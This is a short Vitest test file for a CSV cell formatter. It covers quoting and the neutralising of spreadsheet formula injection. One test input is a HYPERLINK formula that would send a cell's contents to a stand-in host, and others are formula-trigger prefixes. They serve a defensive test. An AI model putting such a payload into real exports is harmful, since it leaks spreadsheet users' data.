import { describe, it, expect } from 'vitest';
import { csvCell } from '../csv';

describe('csvCell', () => {
  it('formats empty values, dates and plain text', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(csvCell(new Date('2026-01-02T03:04:05Z'))).toBe('2026-01-02T03:04:05.000Z');
    expect(csvCell('Jurnal penyesuaian')).toBe('Jurnal penyesuaian');
    expect(csvCell(false)).toBe('false');
  });

  it('quotes commas, quotes and newlines', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('neutralises text a spreadsheet would run as a formula', () => {
    expect(csvCell('=HYPERLINK("http://x/?"&A1,"klik")')).toBe(`"'=HYPERLINK(""http://x/?""&A1,""klik"")"`);
    expect(csvCell('+1+1')).toBe("'+1+1");
    expect(csvCell('-2+3')).toBe("'-2+3");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\tcmd')).toBe("'\tcmd");
    expect(csvCell('\r=1')).toBe(`"'\r=1"`);
  });

  it('leaves numbers alone', () => {
    expect(csvCell(-5)).toBe('-5');
  });
});
